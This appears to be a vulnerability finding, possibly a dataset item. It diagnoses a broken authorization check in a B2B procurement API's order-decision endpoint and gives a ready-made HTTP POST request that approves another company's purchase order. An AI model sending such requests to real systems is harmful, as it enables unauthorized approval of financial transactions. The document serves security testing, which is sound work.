diagnosis: The procurement order approval endpoint validates the DTO using class-validator regex and enum checks, but executes the decision update on the PurchaseOrder entity using poNumber without checking if the purchase order belongs to the buyer company associated with the authenticated user.
exploit_request:
POST /api/procurement/orders/decision HTTP/1.1
Host: b2b.supplychain.net:7002
Authorization: Bearer <manager_vendor_jwt>
Content-Type: application/json

{"poNumber": "PO-991823", "decision": "APPROVED", "approvedBudget": 45000}
